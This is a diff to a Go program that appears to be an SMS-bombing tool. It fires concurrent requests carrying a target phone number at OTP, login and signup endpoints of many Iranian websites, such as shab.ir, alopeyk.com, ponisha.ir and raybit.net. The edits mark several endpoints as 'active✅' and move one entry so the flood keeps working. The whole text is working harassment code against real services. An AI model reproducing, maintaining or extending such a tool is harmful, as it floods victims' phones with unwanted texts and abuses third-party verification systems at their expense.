@@ -197,7 +197,11 @@ func main() {
 		}, ch)  // edit :4/22/2025
 		go sms("https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
 			"mobile": phone,
-		}, ch)  // edit :4/22/2025
+		}, ch)     //active✅
+		s15 := fmt.Sprintf("'mobile': %s, 'country_code': '+98'", phone)
+		go sms("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
+			s15: phone,
+		}, ch)    //active✅
 		go sms("https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
@@ -207,7 +211,7 @@ func main() {
   //delete site from domain
 		go sms("https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
+		}, ch)     //active✅
  //delete site from domain
 		go sms("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
 			"contact": phone,
@@ -352,7 +356,7 @@ func main() {
 		}, ch)
 		go sms("https://alopeyk.com/api/sms/send.php", map[string]interface{}{
 			"phone": phone,
-		}, ch)
+		}, ch)   //active✅
 		go sms("https://1401api.tamland.ir/api/user/signup", map[string]interface{}{
 			"Mobile": phone,
 		}, ch)
@@ -400,8 +404,7 @@ func main() {
 		}, ch)
 		go sms("https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
 			"phone": phone,
-		}, ch)
-
+		}, ch)    //active✅
 		go sms("https://api.dadhesab.ir/user/entry", map[string]interface{}{
 			"username": phone,
 		}, ch)
@@ -516,10 +519,6 @@ func main() {
 		s14 := fmt.Sprintf("'mobile': %s,'origin': '/'','referrer_id': ''", phone)
 		go sms("https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", map[string]interface{}{
 			s14: phone,
-		}, ch)
-		s15 := fmt.Sprintf("'mobile': %s, 'country_code': '+98'", phone)
-		go sms("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
-			s15: phone,
 		}, ch)
 		s16 := fmt.Sprintf("'mobile':%s,'side':'web'", phone)
 		go sms("https://api.raybit.net:3111/api/v1/authentication/register/mobile", map[string]interface{}{
